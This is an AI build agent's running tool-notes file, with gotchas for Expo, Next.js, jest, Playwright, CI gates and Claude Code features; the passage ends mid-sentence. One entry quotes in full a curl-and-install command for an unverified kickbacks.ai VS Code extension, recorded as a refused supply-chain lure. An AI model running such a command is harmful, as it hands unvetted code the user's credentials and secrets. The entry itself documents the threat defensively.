# Tool Notes — what worked, what bit us

Execute updates this after each project. One entry per tool from the library (execute.md Part 4): what worked, gotchas, preferred patterns, versions that mattered. Starts mostly empty; fills as projects run.

## Expo + expo-router (SDK 56, RN 0.85, React 19) — an example app 2026-06
- Worked: full MVP on web + Expo Go with file-based routing and API routes (`app/api/*+api.ts`); `expo export --platform web` as a cheap CI-grade verification gate.
- Gotcha: `create-expo-app` prompts interactively when run inside an existing git repo — it still scaffolds; expect the prompt in automation. Read the versioned docs (docs.expo.dev/versions/v56.0.0) — SDK 56 moved fast past training data.
- Preferred: set `"main": "expo-router/entry"` in package.json (the entry switch); keep `AGENTS.md`/`CLAUDE.md` in the project pointing builders at the versioned docs.

## zod v4
- Worked: a single store-document schema doubled as a structural privacy guarantee (the schema cannot express forbidden data shapes).
- Gotcha: `.default({})` on object schemas fails typing in v4 — use `.prefault({})` instead.
- Preferred: one canonical document schema; parse at every storage boundary.

## jest-expo + @testing-library/react-native v14
- Worked: 47 tests (pure engines, store integration, screen-flow e2e, API) on the plain `jest-expo` preset.
- Gotcha 1: RNTL v14 made `render()` ASYNC — you must `await render(...)` or `screen` never binds and every query fails mysteriously.
- Gotcha 2: do NOT override `transformIgnorePatterns` — the jest-expo preset already handles RN/Expo packages; overriding it breaks transforms.
- Gotcha 3: singleton stores need a `JEST_WORKER_ID` check to fall back to an in-memory driver, or tests fight over native storage.
- Gotcha 4: the suite leaks an open handle ("A worker process has failed to exit gracefully" / "Force exiting Jest") — so a plain `jest`/`npm test` can HANG INDEFINITELY after every test has passed. Backgrounded, it sits forever (a 2s run hung 25 min once). ALWAYS run with `--forceExit` (add `--runInBand --ci` for determinism) and wrap in a hard cap: `timeout 150 npx jest <file> --ci --runInBand --forceExit`. Never launch a bare jest run in the background and wait on it.
- Preferred: minimal config — preset + moduleNameMapper + testMatch + clearMocks (see projects/example-app/jest.config.js).

## Metro (web bundling of native modules)
- Gotcha: Metro statically bundles even *dynamic* `import('expo-sqlite')` into web builds, breaking web export.
- Preferred: platform-split files — `sqliteDriver.native.ts` (real SQLite) + `sqliteDriver.ts` (web/localStorage driver). Metro picks `.native.ts` on iOS/Android and the plain file on web; native modules never enter the web bundle. expo-sqlite on web also needs wasm assets — avoid it there entirely.

## Neon (@neondatabase/serverless)
- Worked: wired into expo-router API routes (`/api/sync`) behind `DATABASE_URL` env detection; app fully functional without it (local-first, key-gated sync).
- Preferred: serverless driver in API routes only, never in client code; degraded local path first, TODO(keys) + SETUP-KEYS.md entry.

## Clerk (@clerk/clerk-expo)
- Worked: integration wired and key-gated — guest mode is the default path, real accounts unlock when `EXPO_PUBLIC_CLERK_PUBLISHABLE_KEY` appears.
- Preferred: keyless-first — never make auth a build blocker; guest mode + documented key in SETUP-KEYS.md.
- Gotcha (2026-07): `@clerk/clerk-expo` shipped an **authorization bypass** (GHSA-w24r-5266-9c3c, combining organization/billing/reverification checks) — caught only when the security-gate started running `npm audit` on every push. `npm audit fix` resolved it as a lockfile-only semver-compatible bump (`tsc --noEmit` clean after). Auth SDKs get advisories too — audit them on every push, not at install time.

## Claude API (@anthropic-ai/sdk)
- Worked: streaming narration behind `ANTHROPIC_API_KEY` with a deterministic template fallback when absent — a single integration point (`src/ai/narrate.ts`) so the model/provider is swappable.
- Preferred: key-gate AI features with a useful non-AI fallback; rate-limit and cap tokens per the hard build rules.

## Lenis (smooth/inertia scroll) — 2026-06
- The "flow" engine the premium reference sites use (db-longbow.webflow.io literally ships Lenis — found by grepping its HTML). It's what makes a page feel premium vs "standard" for this owner.
- Install `npm i lenis`; **default import** (`import Lenis from "lenis"`). Drive it with ONE `requestAnimationFrame` loop (`lenis.raf(time)` inside the loop). Disable entirely under `prefers-reduced-motion` (return early, render nothing).
- Route in-page anchors through it: intercept `a[href^="#"]` clicks and call `lenis.scrollTo(target, { offset: -88 })` (offset clears a fixed nav), else links hard-jump.
- Add the Lenis CSS (`html.lenis, html.lenis body { height: auto }`, `.lenis.lenis-smooth { scroll-behavior: auto !important }`, `[data-lenis-prevent] { overscroll-behavior: contain }`) or the smooth scroll fights native `scroll-behavior: smooth`.
- **Coexists with framer-motion:** `useScroll` reads window scroll, which Lenis still drives — scroll-linked motion keeps working. Mount it once at the root (a `<SmoothScroll/>` client component in `layout.tsx`).

## Higgsfield MCP (image gen) — free plan, 2026-06
- **No free video.** `generate_video` (and the premium image models) require a PAID plan AND an MCP approval; a free plan (~8.65 cr) can't generate video at all. Even `soul_location` images need a paid plan. So for a "cinematic" hero on a free plan, the stand-in is free `z_image` stills + a CSS Ken Burns push + crossfade (`@keyframes`, opacity transitions) — looks cinematic, costs nothing. Real generated hero video stays a paid open item.
- `soul_location` requires a PAID plan; `z_image` works on free (~0.12 cr/img). `generate_image get_cost:true` reports a price but does NOT check plan entitlement, so a "cheap" job can still be rejected at submit.
- Gotcha: on dark "premium brand poster" / title-card prompts, z_image injects garbled TITLE/letter artifacts. Mitigate by describing a plain scene (no implied text) + strong negatives ("no text, no letters, no title, no watermark"), or crop the result. For real product photography, curated stock beats it outright (see Pexels note).
- Free plan = 1 concurrent job. Submit, then poll `show_generations` and read only `completed` items (don't trust an in-flight status). Sandbox flow: import a web URL with `media_import_url` first and pass the returned `media_id` — never raw URLs in `medias[].value`.

## Curated stock photography (keyless) — 2026-06
- Pexels CDN works with NO API key: direct `https://images.pexels.com/photos/<id>/<slug>.jpeg?auto=compress&cs=tinysrgb&w=<N>` returns 200. Discover ids/urls by WebFetch-ing a Pexels search page (e.g. `pexels.com/search/forest%20desk/`) and extracting the CDN links from the HTML — or `curl` the search page and grep for `images.pexels.com/photos/` URLs.
- Unsplash: the old `source.unsplash.com` random endpoint is DEAD (503). `https://images.unsplash.com/...` direct CDN URLs still work if you have a specific photo id.
- Preferred: pull the photo at build time, convert to webp, commit it locally (`public/backgrounds/*.webp`) — no runtime dependency on the CDN, no key, deterministic.

## sharp (in-sandbox image conversion) — 2026-06
- Install without polluting the project: `npm i --no-save sharp` (leaves `package.json` clean). Run a throwaway script from `/tmp` with `NODE_PATH="$PWD/node_modules" node /tmp/conv.mjs`. NOTE: `--no-save` packages get pruned by any later `npm i`/`uninstall` — reinstall if you need them again (same trap as playwright below).
- webp q80 crushed ~4.5MB source PNGs to ~30–235KB each on the an example app backgrounds — big LCP win for landing pages.
- Cleanup reminder: when you rip out an icon/component library to de-generic a UI, also drop the now-unused dep (e.g. `lucide-react` lingered in package.json with zero imports).

## Playwright (headless screenshots in sandbox) — 2026-06
- Install: `npm i --no-save playwright && npx playwright install chromium` — Chromium lands in `/opt/pw-browsers`. Run with `PLAYWRIGHT_BROWSERS_PATH=/opt/pw-browsers`.
- **`--no-save` installs get pruned.** `npm i --no-save playwright` (and `--no-save sharp`) leave `package.json` clean, BUT any later `npm i`/`npm uninstall` prunes the un-saved packages — so **reinstall playwright right before a screenshot run** if you've touched deps since.
- TRAP: `pkill -f "next start"` also matches your OWN shell command string and kills the calling process (exit 144). Don't pkill by pattern — kill by port, or just start a fresh server on a new port and screenshot that.
- **Verify BOTH themes and mobile.** Make separate Playwright contexts with `colorScheme: "light"` and `"dark"` (and set the `.dark` class / `localStorage.theme` to force the page's class-based toggle), and a 390px-wide mobile context. Assert no horizontal overflow with `scrollWidth <= innerWidth` (`document.documentElement.scrollWidth <= window.innerWidth`) — this catches off-screen initial transforms (e.g. a card animating in from `x:` that extends page width on mobile; fix by entering on `y:` instead).
- Use this to verify rendered pixels (see principle): a screenshot is the only artifact that proves a UI change to the human.

## Next.js 16 (App Router) — 2026-06
- Versions that mattered: `next 16.2.9`, `react 19.2.4`, Tailwind v4, fonts via `next/font/google` exposed as CSS vars on `<html>` (current an example app stack: `Playfair_Display` display incl. `style: ["normal","italic"]`, `Inter` sans, `Fraunces` serif — Playfair superseded the earlier Fauna One).
- **Class-based dark mode on Tailwind v4:** declare `@custom-variant dark (&:where(.dark, .dark *));` in `globals.css` (the `:where()` keeps specificity 0). Toggle by adding `.dark` to `<html>`. Prevent the light→dark flash with a synchronous inline `<script>` in `<head>` (reads `localStorage.theme` then `prefers-color-scheme`, sets the class before first paint) + `suppressHydrationWarning` on `<html>`. A `useSyncExternalStore` + `MutationObserver` switch component stays in sync without setState-in-effect (lint-clean).
- `public/` convention is standard (`public/x` → served at `/x`).
- Gotcha: `next start` serves the build snapshot captured at startup — new code/assets DON'T appear until you rebuild AND restart. To screenshot a fresh change: rebuild, then start on a new port (avoids the pkill trap above), then capture.
## an example app effects layer is a reusable kit — an example marketing site 2026-06
- `projects/example-marketing-site/src/components/{aceternity,twentyfirst,reactbits}` (Aurora, Spotlight, SplitText,
  TextGenerate, ShinyText, BentoGrid spotlight-follow, Marquee, Particles) port almost verbatim into any
  Next 16 + Tailwind v4 site: same `cn` util, framer-motion, and `@theme` forest tokens. Pair with
  Fraunces (serif, `axes:["opsz","SOFT"]`) + Inter and the `.glass`/gradient utilities from its globals.css.
- Gotchas hit on the port: (1) `TextGenerateEffect` must put the inter-word space OUTSIDE the
  `inline-block` motion span or words collapse together; (2) `PageHero` using `SplitText` needs `title` as
  a **string**, not JSX — convert accented `<span>` titles to plain text; (3) dark canopy/pine heroes mean
  the sticky nav + mobile menu need a light-on-dark state before scroll and an opaque (not `.glass`)
  mobile dropdown, or text/hero bleed through.

## Icons — minimal, socials-only; Phosphor not Lucide — an example marketing site 2026-06
- **Owner preference: icons ONLY on social links; none elsewhere; never Lucide** (see user-profile.md).
  Replace decorative icons with typography + CSS accents (gold rule/bar, numbered badge, CSS hamburger/caret/spinner).
  Phosphor brand logos (`FacebookLogo`/`InstagramLogo`/`YoutubeLogo`, `weight="fill"`) cover the socials.
- Gotcha (Lucide): `lucide-react@1.x` **dropped trademarked brand icons** (Facebook/Instagram/YouTube) — builds
  fail with "export X doesn't exist". Phosphor keeps them (`FacebookLogo`/`InstagramLogo`/`YoutubeLogo`, use `weight="fill"`).
- Gotcha (Phosphor): components call `useContext(IconContext)`, which is **unsafe in React Server Components**.
  Fix: one `src/components/ui/icons.tsx` with `"use client"` that re-exports the needed icons — aliasing to the
  app's existing names (`Sparkle as Sparkles`, `CaretDown as ChevronDown`, `CircleNotch as Loader2`, `List as Menu`,
  `Microphone as Mic`, `DeviceMobile as Smartphone`, `UsersThree as Users`, `Wheelchair as Accessibility`,
  `NavigationArrow as Navigation`, `EnvelopeSimple as Mail`, `PaperPlaneTilt as Send`, `Handshake as HeartHandshake`)
  so each call site only changes its import source. Phosphor honors Tailwind `size-*` classes (CSS overrides the 1em default).
- Gotcha: Phosphor's CJS `require()` returns an empty object (lazy shim) — don't verify names via `node -e require`;
  check `node_modules/@phosphor-icons/react/dist/csr/<Name>.d.ts` instead. Turbopack uses the ESM build fine.

## Skill library (vetted, shelved — NOT auto-loaded) — 2026-06
Ingested from execute.md §4.1/§4.2 references into `.claude/skill-library/` (see its README). Kept OUT of
`.claude/skills/` on purpose: several carry executable scripts, and auto-loading untrusted third-party code
as startup config is a supply-chain risk. Copy a single folder into `.claude/skills/` on demand when a build
needs it (review scripts first).
- **llm-council** — multi-LLM consult (ChatGPT+Gemini) = the fact-check gate. Needs `OPENAI_API_KEY` +
  `GEMINI_API_KEY` (see `llm-council/.env.template`) to actually run; absent keys, fact-check from the model.
- **impeccable** — design-antipattern detector (browser/DOM + static engines, Node scripts).
- **karpathy-guidelines** — SWE workflow/standards.
- **ui-ux pack** (7): banner-design, design-system, brand, design, slides, ui-ux-pro-max, ui-styling.
- **taste pack** (13): brandkit, redesign-skill, imagegen-frontend-web/-mobile, soft/brutalist/minimalist-skill,
  taste-skill(+v1), gpt-tasteskill, stitch-skill, output-skill, image-to-code-skill.
- Overlap: taste/ui-ux duplicate the installed `design-taste-frontend`/`premium-scroll-flow` — shelved to
  avoid skill-selection ambiguity.

## Register-only sources (NOT vendored — pull per project on demand)
Too large or not skills, so referenced rather than copied:
- **antigravity-awesome-skills** (github.com/sickn33/antigravity-awesome-skills) — 5,378 skills; browse + cherry-pick, never bulk-install.
- **awesome-agent-skills** (VoltAgent) + **awesome-design-md** (VoltAgent) — curated link-lists, no SKILL.md.
- Frameworks/tools (install-per-project per Part-4 library, never as skills): GitReverse, Browser Harness,
  ECC, Ruflo, LangGraph/CrewAI/LangChain, AutoGPT, Codex Plugin CC, notebooklm-py.

## A11y + responsive verification recipe (axe-core via Playwright) — an example marketing site 2026-06
Reusable, keyless QA pass for any static/SSR web build — this is the "real tool, not a vibe" proof for
checklist #25 (a11y) and the universal-sizing check. Worked end-to-end:
- **Serve the build** (`out/` from `next build` static export) with `python3 -m http.server` (run it as a
  real background process — a `&` subshell inside a single tool call gets reaped; use the harness's
  background-run). Browsers live at `/opt/pw-browsers`; drive global Playwright (`/opt/node22/lib/node_modules/playwright`)
  with `PLAYWRIGHT_BROWSERS_PATH=/opt/pw-browsers`.
- **axe-core is already vendored** at `node_modules/axe-core/axe.min.js` (via `eslint-plugin-jsx-a11y`). Inject
  it with `page.evaluate(axeSource)` then `await window.axe.run(document,{runOnly:['wcag2a','wcag2aa','wcag21a','wcag21aa']})`.
  Each violation node's `any[0].data` gives `fgColor/bgColor/contrastRatio/expectedContrastRatio/fontSize` — enough
  to fix contrast precisely without guessing.
- **Overflow check** in the same sweep: assert `document.documentElement.scrollWidth === window.innerWidth`
  per route × 375/768/1440; rank `getBoundingClientRect().right` to find the offending node.
- **Gotchas:** (1) an intro loader/animation (e.g. BibleLoader) covers the hero — wait ~4s before
  screenshotting or you capture the loader, not the page. (2) `requestfailed` noise from Next.js route
  **prefetch** aborts (`ERR_ABORTED`) and from externally-blocked embeds (an OSM iframe under a sandbox
  proxy) are not real errors — filter them; only `console.error`/`pageerror` count.
- **Contrast fix patterns that preserved the design:** dimming via `opacity-*` on small text *can't* pass AA —
  use a darker colour token instead; for an active/inactive list, give the active item an accent colour + full
  ink and the inactive a passing muted (`text-ink/65`+) rather than an opacity toggle. Scripts kept in the
  session scratchpad (probe.mjs / contrast.mjs).
- **More axe realities (an example marketing site, 2026-07):** (1) `color-contrast` flags `aria-hidden` text too — it's a
  *visual* rule, so decorative pale text must actually meet 3:1 (large) / 4.5:1, not just be hidden from AT.
  (2) `aria-label` is **prohibited on plain `<span>`/`<div>`** (no role) — axe `aria-prohibited-attr`; give it
  a role or drop the label. (3) A single brand colour used both as text-on-white AND as a bg under white text
  must clear ≥4.5:1 against white once — same pair, both directions (ember `#c77e3c` failed → `#a05416`).
  (4) **Framer entrance delays must finish before the sweep's axe settle (2400ms)** or mid-fade colours read
  as contrast failures — keep hero entrance chains ≤ ~1.5s total (better UX anyway).
- **SVG path template gotcha:** building paths as `M-${expr}` yields `M--4` once the expr goes negative —
  Chromium rejects the path ("Expected number") and the element **silently vanishes** (no console error at
  render, only the beam missing). Compute signed numbers (`M${i*32 - 380}`); never prefix `-` to an
  expression that can itself be negative.

## Red flag — unverified "install this to get paid" tooling (kickbacks.ai) — 2026-06
Owner was handed `curl -L https://kickbacks.ai/vsix -o kickbacks.vsix && code --install-extension kickbacks.vsix`,
pitched as "now part of Execute" with a payout lure. **Refused / do not run.** Why it's the textbook
supply-chain shape: (1) a VSIX / editor extension runs with the **builder's full privileges** — every repo,
git credential, API key, `.env`, and live Claude session on the machine; (2) "it's part of <your tool>" was
false (grepped the repo: zero references); (3) the command targets the operator's *local* editor, not this
remote container, so running it via the agent does nothing useful anyway; (4) having an account / being
logged in says nothing about the payload. Verify provenance first (publisher, VS Code Marketplace listing,
official docs), sandbox if genuinely wanted, never pipe an unverified binary onto a machine holding client
creds. Generalised into `principles.md` (dev-environment = supply chain) + checklist #30.

## Framer Motion + Next 16 static export (reduced-motion / SSR) — an example marketing site 2026-06
The biggest recurring pain of the build. Rules that hold:
- **Keep `initial`/`hidden` deterministic.** Branching it on `useReducedMotion()` makes the SSR HTML differ from a reduced-motion client → hydration mismatch. Let reduced-motion only zero the *transition*, never change the initial state.
- **Don't rely on `MotionConfig reducedMotion="user"` for transform-based reveals.** It disables transforms for reduced-motion users, which hides any reveal that uncovers text via a transform (mask-rise heading → text parked off-screen → invisible).
- **`useReducedMotion()` ignores MotionConfig** — it reads the OS media query directly. A force-motion flag routed through MotionConfig won't reach hook-based components. For autonomous pointer flourishes, gate on a `motionAllowed()` helper that reads `window.matchMedia` with a `NEXT_PUBLIC_FORCE_MOTION=1` override (see `src/lib/motion.ts`).
- **Final working pattern = scroll-linked reveals** (`useScroll` + `useTransform` on the element's own scroll position; `src/components/site/Reveal.tsx` with `mode: "scroll" | "load"`). Always reach the visible target, can't be skipped by a fast flick, play for everyone (WCAG-AA fine). Above-the-fold content uses `mode: "load"` (a one-shot deterministic `initial`), because scroll-linked would render it only part-way up at first paint.
- **Sideways (x) reveals need `overflow-x: clip` on a wrapper, NOT `overflow-hidden`** — `overflow-hidden` breaks `position: sticky` scroll scenes. Applied to `<main>` in `src/app/layout.tsx`.
- **The hydration mismatch is DEV-only** and won't appear in the served static `out/` — caught instead by a source lint in the sweep (see below).

## visual-qa sweep.mjs — gate hardening (mechanical, fails the build) — an example marketing site 2026-06
`.claude/skills/visual-qa/sweep.mjs` now does more than screenshot. Each became a deterministic check that exits non-zero, because a gate that self-attests is a lie:
- **Cramped section seams** — a heavy/full-bleed/dark section followed by a light section whose first heading sits flush (<44px desktop / <28px mobile from the seam) is measured + fails.
- **Cross-route band repetition** — the same full-bleed band image used on 2+ routes is flagged + fails (overflow/a11y never see this; it reads as lazy/templated).
- **Reduced-motion hydration source lint** — scans `.tsx/.jsx` for `initial={{…reduce…}}` / `hidden:{…reduce…}` / `whileInView={{…reduce…}}` and fails. This is how you catch the dev-only hydration bug that the served build can't show you.
- **axe must actually run** — it was silently `skip`-ing when axe-core wasn't on the default path. Pass `AXE=…/node_modules/axe-core/axe.min.js`. For the axe pass, scroll through to trigger every `whileInView` reveal, then wait out the *longest* animation before sampling — else a reveal caught mid-fade reads as a false low-contrast fail. Force-settling inline styles does NOT stick (Framer's rAF overwrites them) — actually let them finish.
- **Speed:** was ~22 min (fully sequential, flat 4.5s/route wait). Parallelising routes (page pool, `VQA_CONCURRENCY` default 4) + hydration-gated waits → ~45s. Now cheap enough to run per commit.

## Turbopack / `next build` flake on the slow workspace FS — 2026-07
- **Nondeterministic broken chunk graph:** `next build` (Turbopack) occasionally emits a chunk graph
  referencing a chunk that doesn't exist on disk → the browser gets a 500 on
  `/_next/static/chunks/<id>.js` and every affected route logs a console error. A clean rebuild
  usually rolls a good graph.
- **Mitigation (now the standard flow):** build → playwright-probe **all** routes for ≥400 responses →
  rebuild if dirty → sweep the *verified* artifact with `visual-qa/run.sh --no-build`. Never re-build
  between verifying and sweeping — you'd sweep a different (possibly broken) artifact.
- **Relocating `.next` via symlink breaks Turbopack BUILDS** (module resolution refuses to cross it) —
  that trick is dev-server-only. `run.sh` handles the leftover symlink (empties the target instead of
  deleting the link).

## Process/server hygiene for gates & sweeps — 2026-07
- **Self-kill bug class:** `pkill -f "pattern"` / `pgrep -f` kills **your own shell** (exit 144) when
  the pattern substring appears anywhere in your own command line — and the `[s]tart` bracket trick
  does NOT save you if the literal string also appears elsewhere in the same compound command (e.g.
  the launch line you're re-running). Rule: **kill by pidfile or by port** (`fuser -k PORT/tcp`) from
  a *separate* command; never kill by pattern in the same command that mentions the target.
- **Orphaned-server bug class:** a crashed run's `python3 -m http.server` squats the port and a later
  sweep silently measures the WRONG SITE (happened: a an example marketing site sweep measured an example marketing site — every
  route 404). **statusText fingerprints identify which server answered** (python says "File not
  found"; Next/serve say "Not Found"). Never sweep a port you didn't just bind. `visual-qa/run.sh`
  now enforces all of it: pidfile-kill of stale servers, refuse busy ports (walk up), loud abort if
  the server never comes up, hard time budgets (`timeout(1)`: build ≤600s, sweep ≤480s — a hang can
  never wedge a session or leave orphans).

## Pre-push + CI gate stack — 2026-07
- Pushes to ANY branch are blocked by `.claude/hooks/pre-push-gate.sh`, wired from two directions:
  a PreToolUse guard on the `git push` Bash call AND `.githooks/pre-push` (armed via
  `core.hooksPath` each SessionStart). The same gate re-runs in CI (`.github/workflows/gates.yml`,
  push + PR events) so a bypassed local hook still can't merge.
- Four legs per touched project: **security-gate** (secrets/TLS/.env/npm audit) ·
  **system-design-gate** (lockfile/.env.example/TODO(keys)⇒SETUP-KEYS/SQL-interp/token-storage) ·
  **learner discipline** (code change ⇒ PROJECT-LOG.md entry in the same push) ·
  **visual-qa freshness** (front-end change ⇒ `.vqa-pass.json` stamp whose treeHash matches the tree).
- **tree-hash gotcha:** hash file **CONTENT** (`.claude/hooks/tree-hash.sh` cat-hashes the files),
  never `git ls-files -s`-style index state — index metadata changes when you *commit*, so an
  index-based stamp goes stale the moment you commit the stamp itself.
- Escape hatch: `EXECUTE_GATE_BYPASS=1` (owner emergency only; log why in PROJECT-LOG.md).

## Environment gotchas (this container) — an example marketing site 2026-06
- **The local git checkout resets to an old commit between turns.** Everything survived only because it was pushed to origin each phase. Lesson: commit + push per phase; `git fetch` + ff-merge at the start of each turn. (Now in CLAUDE.md hard rules.)
- **`.next` → `/root/.cache` symlink recurs after a container restart** (leftover from an abandoned dev-cache experiment) and breaks `npm run build` with `Cannot find module '@tailwindcss/postcss'` (Turbopack infers the wrong root). Fix: `rm .next` so it's a normal in-project dir, then rebuild. The `predev` script that created it is gone, but the symlink artifact survives restarts.

## Images — baked-in borders + real-org sourcing — an example marketing site 2026-06
- **`object-cover` can't crop letterboxing baked into the pixels** (a 9:16 phone shot on a 4:3 white canvas). Detect the real content bounds with a PIL column/row margin scan and crop, then re-export. Pre-screen imported photos for baked borders before using them full-bleed.
- **For a real organisation, never AI-generate or fabricate people or a venue** — use the owner's real photos (cropped/optimised) or vetted real stock. Off-brand stock is a real miss (a generic Catholic-pew photo on a Nigerian Pentecostal site) — replace sitewide, delete the orphan. Each full-bleed photo used ~once per route (enforced by the band-repetition check above).

## Platform capabilities to track (Anthropic ships fast — verify before depending)
- **Model tiers (adopted in the orchestration rule):** Sonnet 5 = cheap brainstorm/research thought-partner; Fable 5 = frontier architecture/planning/judgment; Opus 4.8 = powerful build/execution at a fraction of frontier cost. Fable plans, Opus builds, Sonnet ideates. Agent frontmatter is set to match (research=sonnet, judgment agents=fable, developer/designer/qa=sonnet for greenfield, opus for existing codebases). The `Agent` tool's `model` param accepts `sonnet|opus|haiku|fable`.
- **Idea→build workflow worth reusing:** brain-dump with Sonnet 5 → structure into a tracker (Linear) as tickets tagged with dependencies / blockers / human-in-loop-or-agent → hand the plan to Fable 5 in the project file to architect from project+ticket context → execute with Opus 4.8 build agents. Same quality, lower cost.
- Auto Mode / memory consolidation / Computer Use / "/dream": VERIFIED 2026-07-07 — see "Claude Code capability check" below (one of the reel's claims was fake). Doc-check before depending; a reel is a lead, not a source.

## Vendored design skills (2026-07, from tool-library repos)
- `git clone`d + vetted (markdown-only, no scripts) into `.claude/skills/`: redesign-skill, soft-skill,
  minimalist-skill, brutalist-skill, imagegen-frontend-web, imagegen-frontend-mobile, brandkit,
  stitch-skill, output-skill (source: Leonxlnx/taste-skill, MIT). They auto-load on description match and
  serve UNDER `owner-design-taste` (the design LAW) + `caveman-mode`. See `.claude/skills/VENDORED-SKILLS.md`.
- NOT vendored: **impeccable** (127MB app + browser/CSP scripts; redundant with `visual-qa`) — install via
  its own CLI if ever needed. **ui-ux-pro-max** (20MB + Python DB tooling) — install via its own installer,
  don't vendor. Generic `taste-skill`/`gpt-tasteskill` — conflict with `owner-design-taste`, skipped.
- Supply-chain rule held: only reviewed, script-free markdown was pulled in (webapp-security-principles §5).

## Claude Code PreToolUse gates vs compound git commands — 2026-07-07
- A PreToolUse hook fires BEFORE the Bash call runs, so a checkout-commit-push one-liner gets gated
  against the PRE-command HEAD/branch — the gate judged a 100-file range when the actual push was
  2 files. Split state-changing git operations and the push into separate Bash calls.
- Same hook also matched the WORDS "git push" inside a heredoc being written to a file and ran the
  full gate on a plain file write. When writing files whose CONTENT mentions git commands, prefer
  the Write tool over a Bash heredoc. (Guard-side fixes drafted; pending owner approval —
  scratchpad apply-execute-improvements.py.)
- The permission classifier denies agent SELF-modification even inside approved work: registering a
  hook in settings.json, deleting a branch, and patching the enforcement hooks were each denied
  (2026-07-07). Don't retry phrasings/variants — batch every change to Execute's own
  enforcement/config machinery into ONE reviewable patch script and hand it to the owner to
  run/approve (the apply-execute-improvements.py pattern).

## yt-dlp through the agent proxy (video links) — 2026-07-07
- TikTok: works end-to-end (metadata + mp4). Direct mp4/webm URLs: work. Instagram: public reels
  verified working (a private one may still need cookies). YouTube: metadata prints, but media
  downloads usually 403 (datacenter bot-wall).
- NEVER pip-install curl_cffi (or the yt-dlp curl-cffi extra) here: yt-dlp then auto-impersonates
  and the impersonated TLS fingerprint is RESET by the agent proxy (curl error 35, connection
  reset), breaking even the previously-working TikTok path. pip uninstall -y curl_cffi restores it.
  Full matrix + paste-a-link workflow: .claude/skills/watch-video/SKILL.md.

## Composio (SaaS-action layer for Execute) — researched 2026-07-07
- Hosted MCP only (no local npx server). Register at **local scope** (`~/.claude.json` or
  `claude mcp add --transport http composio <URL> --headers "X-API-Key:..."`), NOT in the committed
  `.mcp.json` — Claude Code has open bugs (#51581, #18692) where header env-var placeholders get
  written as resolved literal keys. Key: `COMPOSIO_API_KEY` (composio.dev, Settings, Project
  Settings, API Keys; free tier 20K tool calls/month, no card).
- After registration, per-app OAuth (Gmail/Shopify/Notion...) happens interactively: `/mcp`, pick
  the server, Authenticate. `user_id` scopes which connected account a session acts as.
- Least privilege: no global read-only switch — hand-pick an `allowed_tools` allowlist (skip
  `*_DELETE_*`/`*_SEND_*` unless required) or use single-toolkit servers
  (`https://backend.composio.dev/v3/mcp/<SERVER_ID>?user_id=<USER_ID>`). Revoking blast radius =
  revoke the connected account in the Composio dashboard, not just deleting config.
- Transport is Streamable HTTP (proxy-friendly); untested through this sandbox's proxy.

## tmux vs subagents (owner asked, tested 2026-07-07)
- tmux IS in the container (`/usr/bin/tmux`) and detached parallel jobs work (two crawl-site runs
  ran in parallel and self-terminated clean). But: poll-only (capture-pane/flag files — no
  completion notification), invisible to the harness task system, and a container reclaim kills
  sessions silently. Background Bash tasks + the Agent tool do the same job WITH auto-notification,
  per-ticket model tiers, isolated context, and gate/permission integration.
- Verdict: **subagents/background tasks win for Execute's orchestration**; the reel's tmux pitch
  solves a laptop-closed-on-a-VPS problem this cloud environment doesn't have. Keep tmux for the
  niche it's actually good at here: driving interactive TUIs a task must automate.

## Claude Code capability check (rule 6, verified in docs 2026-07-07)
- **Auto Mode: REAL, running in this environment now** — it is the permission classifier that
  arbitrates writes (the self-modification denials). Tunable via `autoMode.environment` in
  `.claude/settings.json` (owner-approved edit; classifier blocks the agent editing it).
- **/dream / AutoDream memory consolidation: NOT REAL** — zero doc/changelog presence; GH #38461
  reports `/dream` returns "Unknown skill". The real memory features: auto MEMORY.md + `/compact`.
  Social-reel claims fail rule 6 verification routinely — always check docs before adopting.
- **Computer Use: real but local macOS/Windows Desktop only** — NOT available in cloud sessions;
  off Execute's roadmap while it runs remote.

## Gas Town (steveyegge/gastown) — built + trialed 2026-07-07
- Builds in-container: needs `apt-get install libicu-dev` first (dolt cgo dep), then
  `GOTOOLCHAIN=auto go install ./cmd/gt` (auto-fetches go1.26 toolchain). gt 1.2.1 ran.
- Trial stopped at the dependency wall: `gt init` requires beads (`bd`) + dolt; the beads
  `go install` was classifier-blocked (external code), and init errors "not a git repository"
  even inside a fresh git repo — misleading message, likely the missing bd.
- **Verdict: DO NOT adopt now.** Design center is a persistent human workstation/VPS town
  (~/gt, 20-30 agents, Mayor as a long-lived interactive Claude Code instance). Execute's
  container is ephemeral and its orchestration needs (5-ish agents, tracked, gated) are already
  covered by the Agent tool + tasks + git-backed memory. Nested `claude` processes spawned by gt
  would be untracked by the harness and double-billed — same objection as tmux-hosted sessions.
- **Steal the one good idea instead:** gastown's "hook" = park uncommitted work state in git so a
  dead agent's successor resumes exactly where it died. Execute's commit-per-green-unit rule
  covers 80% of this; if agent deaths keep costing tickets, consider a WIP-stash-on-death hook.
- Revisit if Execute moves to a persistent VPS or needs >5 concurrent build agents with handoffs.

## Local HF embeddings + jest, and the visual-qa stamp — kb-brain 2026-07
- `@huggingface/transformers` (Xenova/all-MiniLM-L6-v2) gives keyless 384-dim embeddings and downloads
  through the agent proxy fine (verified curl + standalone node). BUT inside **jest** the VM realm trips
  ONNX runtime's typed-array check — real embeds fail only under jest. Fix that worked: a deterministic
  hash-based pseudo-embedding fallback engaged automatically in test mode, so tests stay deterministic
  and offline. Not a proxy problem — a jest-realm problem.
- Bare `"test": "jest"` can hang on a leaked handle (SQLite) → the new pre-push TEST gate would time out
  and false-block. Always ship the project test script as `jest --forceExit`.
- **visual-qa `.vqa-pass.json` tree-hash includes `package.json`** — so editing even the test script
  invalidates the stamp and forces a re-run. Batch package.json edits BEFORE the final visual-qa run.

## Pre-push TEST gate — 2026-07
- The gate now runs a touched project's `npm test` when the push changes `.ts/.tsx/.js/.jsx/.mjs/.cjs`
  under it (docs-only pushes skip). Needs `node_modules` present locally, else it warns + defers to CI.
  Makes "every component has a test" mechanically enforced: a broken test blocks the push.

## Context7 — live, version-correct library docs (added 2026-07)
`@upstash/context7-mcp`, wired keyless in `.mcp.json` (hosted alternative: `https://mcp.context7.com/mcp`
with a `CONTEXT7_API_KEY` header — not needed).
- **What it fixes:** version drift. Models code against whatever library version was in training, then
  invent APIs that no longer exist. Context7 fetches the *current* official docs and code examples for
  a named library/version on demand.
- **Why it matters here specifically:** Execute's project `AGENTS.md` files carry hand-written
  workarounds for exactly this — "read `node_modules/next/dist/docs` before writing Next code",
  "Expo HAS CHANGED, read the v56 docs". Those are manual patches for the problem Context7 automates.
  Keep the manual reads as the fallback; they are still the ground truth for what is actually
